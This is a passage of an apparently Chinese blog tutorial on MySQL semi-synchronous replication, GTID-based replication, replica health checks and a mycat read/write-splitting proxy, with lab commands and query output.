 <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sha2_cache_cleaner              <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUDIT              <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> daemon_keyring_proxy_plugin     <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> DAEMON             <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> CSV                             <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> STORAGE ENGINE     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><br><span class="hljs-number">2.</span>安装半同步插件rpl_semi_sync_master ##主从节点都要安装<br>install plugin rpl_semi_sync_master soname <span class="hljs-string">&#x27;semisync_master.so&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.07</span> sec)<br><br><span class="hljs-keyword">show</span> plugins;<br>rpl_semi_sync_master            <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> REPLICATION        <span class="hljs-operator">|</span> semisync_master.so <span class="hljs-operator">|</span> GPL<br><br><span class="hljs-number">3.</span>修改配置文件<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">on</span> ##开启半同步功能<br>rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><span class="hljs-number">10000</span> ##默认超时时间：<span class="hljs-number">10</span>s，以毫秒为单位，默认<span class="hljs-number">10</span>s<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                          <span class="hljs-number">10000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br>systemctl restart mysqld<br><br><span class="hljs-number">4.</span>查看插件状态<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">5.</span>完全备份到从库，确认log<span class="hljs-operator">-</span>bin的pos，##master和slave1都执行，scp到从库<br>grep <span class="hljs-operator">-</span>i &quot;change master&quot; hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-12</span>_11:<span class="hljs-number">45</span>:<span class="hljs-number">11</span>_all.sql<br><br><span class="hljs-keyword">show</span> master status;<br><span class="hljs-comment">-- CHANGE MASTER TO MASTER_LOG_FILE=&#x27;rocky-bin.000030&#x27;, MASTER_LOG_POS=157;</span><br><br>stop slave;<br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<span class="hljs-operator">/</span>hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-12</span>_11:<span class="hljs-number">45</span>:<span class="hljs-number">11</span>_all.sql<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000030&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> slave status \G;<br>##确认sql_io和slave_io都启动<br><br>##如果遇到以下问题，slave同步问题<br>stop slave;<br>reset slave <span class="hljs-keyword">all</span>;<br><span class="hljs-keyword">start</span> slave;<br></code></pre></td></tr></table></figure><h3 id="2-从节点安装插件"><a href="#2-从节点安装插件" class="headerlink" title="2.从节点安装插件"></a>2.从节点安装插件</h3><p>完成两边的半同步插件安装，现在没有配置timeout，都是10s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs sql">##安装插件和卸载插件，主节点master<br>install plugin rpl_semi_sync_master soname <span class="hljs-string">&#x27;semisync_master.so&#x27;</span>;<br>uninstall plugin rpl_semi_sync_master;<br><br>##从节点安装slave<br>install plugin rpl_semi_sync_slave soname <span class="hljs-string">&#x27;semisync_slave.so&#x27;</span>;<br><br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">1.</span>动态设置变量<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_slave_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">show</span> plugins;<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_enabled <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                              <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br><span class="hljs-number">2.</span>主写入配置文件，从写入配置文件<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>rpl_semi_sync_master_enabled<br>systemctl restart mysqld<br><br>#从写入配置文件<br>[mysqld]<br>rpl_semi_sync_slave_enabled<br>systemctl restart mysqld<br><br><br>##主节点测试查看,clients<span class="hljs-operator">=</span><span class="hljs-number">2</span>才是正确的<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-operator">|</span> Variable_name                              <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_clients               <span class="hljs-operator">|</span> <span class="hljs-number">2</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_avg_wait_time     <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_wait_time         <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_net_waits             <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_no_times              <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_no_tx                 <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_status                <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_timefunc_failures     <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_avg_wait_time      <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_wait_time          <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_tx_waits              <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_wait_pos_backtraverse <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_wait_sessions         <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Rpl_semi_sync_master_yes_tx                <span class="hljs-operator">|</span> <span class="hljs-number">0</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------+-------+</span><br><span class="hljs-number">14</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h3 id="3-测试10s的延迟，如果过了10s没有slave响应，则返回成功"><a href="#3-测试10s的延迟，如果过了10s没有slave响应，则返回成功" class="headerlink" title="3.测试10s的延迟，如果过了10s没有slave响应，则返回成功"></a>3.测试10s的延迟，如果过了10s没有slave响应，则返回成功</h3><p>可以修改全局变量超时时间，单位是ms毫秒</p><p>停掉两个slave的同步看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">stop slave;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                          <span class="hljs-number">10000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br>##修改全局变量<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><span class="hljs-number">2000</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>##无slave响应，需要<span class="hljs-number">10</span>s返回成功，timeout值可以设置<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">10.00</span> sec)<br><br>##有slave响应，秒回，证明半同步复制是成功的<br><span class="hljs-keyword">start</span> slave;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.02</span> sec)<br><br>##MySQL默认配置，在同步后才提交<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Rpl_semi_sync_master_wait_point&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br><span class="hljs-operator">|</span> Variable_name                   <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br><span class="hljs-operator">|</span> rpl_semi_sync_master_wait_point <span class="hljs-operator">|</span> AFTER_SYNC <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br></code></pre></td></tr></table></figure><h1 id="复制过滤器binlog-do-db"><a href="#复制过滤器binlog-do-db" class="headerlink" title="复制过滤器binlog-do-db"></a>复制过滤器binlog-do-db</h1><p>指定哪些库生成二进制文件日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br><br>binlog_do_db<span class="hljs-operator">=</span>db1 ##白名单<br>binlog_ignore_db<span class="hljs-operator">=</span>db2 ##黑名单<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210231279-1827703200.png" alt="image-20220912150721371"></p><h1 id="实现事务的并发自动复制，自动找binlog-pos：GTID-MySQL-5-7及以上"><a href="#实现事务的并发自动复制，自动找binlog-pos：GTID-MySQL-5-7及以上" class="headerlink" title="实现事务的并发自动复制，自动找binlog_pos：GTID(MySQL 5.7及以上)"></a>实现事务的并发自动复制，自动找binlog_pos：GTID(MySQL 5.7及以上)</h1><p>好处：可以在主从复制关系中，不需要管理员或者是用户去关注binlog的pos，开启gtid，自动寻找事务的binlog点，自动复制新东西过来</p><p>支持多DUMP线程自动复制，大大降低延迟</p><p>事务的唯一性：GTID=server_uuid+transaction_id，是全局唯一的</p><p>server_id来源于：/data/mysql/auto.cnf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">[root@rocky mysql]#cat auto.cnf <br>[auto]<br>server-uuid=5aa76b1b-1b77-11ed-9219-000c29333d85<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210231530-539993403.png" alt="image-20220912160300417"></p><p>开启GTID，主从节点都要开启这个GTID_MODE</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>gtid_mode<span class="hljs-operator">=</span><span class="hljs-keyword">on</span><br>enforce_gtid_consistency<br><br>systemctl restart mysqld<br><br>##查看主节点的pos<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000032</span> <span class="hljs-operator">|</span>      <span class="hljs-number">157</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><br>##从节点配置<br>stop slave;<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_AUTO_POSITION<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>#MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave-bin.000004&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>; <span class="hljs-comment">---&gt;这一段可以不要了</span><br><br><span class="hljs-keyword">start</span> slave;<br>##也可以<br>resrt slave <span class="hljs-keyword">all</span>;<br><br>##已和主节点同步完成了，做复制方便很多了<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: Waiting <span class="hljs-keyword">for</span> source <span class="hljs-keyword">to</span> send event<br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000032</span><br>          Read_Master_Log_Pos: <span class="hljs-number">157</span><br></code></pre></td></tr></table></figure><h1 id="MySQL主从复制的一些监控健康性-bash实现"><a href="#MySQL主从复制的一些监控健康性-bash实现" class="headerlink" title="MySQL主从复制的一些监控健康性(bash实现)"></a>MySQL主从复制的一些监控健康性(bash实现)</h1><p>使用监控软件监控的时候，需要检查一些指标，使用bash看出来就好了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">##监控复制的健康，两个进程，从节点slave<br>mysql <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-operator">-</span>e <span class="hljs-string">&#x27;show slave status\G&#x27;</span> <span class="hljs-operator">|</span> awk <span class="hljs-operator">-</span>F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;/Slave_IO_Running/&#123;print $2&#125;&#x27;</span><br>mysql <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-operator">-</span>e <span class="hljs-string">&#x27;show slave status\G&#x27;</span> <span class="hljs-operator">|</span> awk <span class="hljs-operator">-</span>F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;/Slave_SQL_Running/&#123;print $2&#125;&#x27;</span><br><br><span class="hljs-keyword">show</span> master status; ##主节点的binlog<br><span class="hljs-keyword">show</span> binlog events; ##查询binlog日志的内容<br>mysqlbinlog rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000003</span> <br><span class="hljs-keyword">show</span> slave status \G;<br><span class="hljs-keyword">show</span> processlist;<br><br>stop slave<br>reset slave <span class="hljs-keyword">all</span><br><span class="hljs-keyword">start</span> slave<br><br><span class="hljs-number">1.</span>配置gtid，实现自动识别binlog的pos<br><span class="hljs-number">2.</span>减少大事务的产生，减少同步复制延迟<br><span class="hljs-number">3.</span>减少锁机制<br><span class="hljs-number">4.</span>建立主从机制<br></code></pre></td></tr></table></figure><h2 id="造成MySQL主从数据不一致的原因"><a href="#造成MySQL主从数据不一致的原因" class="headerlink" title="造成MySQL主从数据不一致的原因"></a>造成MySQL主从数据不一致的原因</h2><p><img src="2792175-20220925210231848-950460808.png" alt="image-20220912204234766"></p><p>binlog格式(row级别或者是statement级别语句)、是否开启binlog、同步是否正常(show slave status)、服务是否正常，版本是否一致(最好是从节点高)等</p><p>主库的复制账号sync没有grant replication slave权限</p><p>定期监控主从之间的心跳问题，监控slave status状态</p><p>—-&gt;重新完全备份，导入，重新建立主从关系等</p><h1 id="mycat：数据库proxy的实现"><a href="#mycat：数据库proxy的实现" class="headerlink" title="mycat：数据库proxy的实现"></a>mycat：数据库proxy的实现</h1><p>proxy服务器：用于写好逻辑，如果写请求，就到主节点；如果是读请求，就到从节点(更新机、查询机等)</p><p>垂直拆分：分库分表，关系不大的表可以拆分，如果是例如stu表和teacher表的话，那就是不太方便的；分库的话，可以和开发协商好；根据不同的业务类型进行拆分</p><p>水平拆分，放在不同的服务器中，以便解放性能瓶颈，或者读写分离等</p><p>—&gt;通过proxy代理来区分数据需要放在什么节点上，proxy代理节点也要冗余双节点，以免出现单点故障的问题</p><p>主要功能：实现一个MySQL代理proxy的功能，通过proxy与后端多个MySQL服务器相连，实现大规模的MySQL服务器集群功能</p><p>mycat核心协议：JDBC，与多个主流数据库相连，mycat是对数据库层面的抽象</p><p>工作原理：前端（HA-proxy）负载均衡—mycat proxy代理集群（冗余节点）—转发请求到后端1-N个MySQL服务器节点（冗余节点），类似K8s集群中，我们需要两个nginx节点做转发一样，万一一个pod挂了，还有另一个nginx pod作为转发请求</p><p>mycat实现读写分离：</p><p>1.接收写操作请求：转发到后端主节点，更新机</p><p>2.接收读请求：转发到后端查询机，读节点</p><p><img src="2792175-20220925210235790-1206678279.png" alt="image-20220917102509163"></p><h2 id="mycat实现读写分离"><a href="#mycat实现读写分离" class="headerlink" title="mycat实现读写分离"></a>mycat实现读写分离</h2><p><img src="2792175-20220925210236104-270498722.png" alt="image-20220917105334174"></p><p>环境：客户端ubuntu 10.0.0.131</p><p>mycat节点：10.0.0.130</p><p>主节点：10.0.0.132</p><p>从节点：10.0.0.128</p><h2 id="1-下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装"><a href="#1-下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装" class="headerlink" title="1.下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装"></a>1.下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装</h2><p>适用于所有编译安装的服务，可以将路径写到环境变量里面去，就不用人为进入到bin目录下了，类似tomcat也一样的，nginx等很多服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xf Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz -C /mycat<br><br><span class="hljs-comment">##查看包内的内容，已经编译好的东西，可以直接使用</span><br>bin  catlet  conf  lib  logs  version.txt<br><br><span class="hljs-comment">##修改执行文件的path路径，让他能够直接执行，不需要加上执行文件路径</span><br>原路径：/apps/mycat/bin/mycat<br><br>vim /etc/profile.d/mycat.sh，让系统执行mycat指令的时候，直接去调用环境变量的PATH<br>PATH=/apps/mycat/bin:<span class="hljs-variable">$PATH</span><br><span class="hljs-comment">##让环境变量生效</span><br>. /etc/profile.d/mycat.sh / <span class="hljs-built_in">source</span> /etc/profile.d/mycat.sh<br><br>[11:01:44 root@proxy bin]<span class="hljs-comment">#mycat</span><br>Usage: /apps/mycat/bin/mycat &#123; console | start | stop | restart | status | dump &#125;<br></code></pre></td></tr></table></figure><h2 id="2-安装java编译环境，修改mycat默认端口"><a href="#2-安装java编译环境，修改mycat默认端口" class="headerlink" title="2.安装java编译环境，修改mycat默认端口"></a>2.安装java编译环境，修改mycat默认端口</h2><p>升配一下mycat节点的内存，java进程比较吃内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 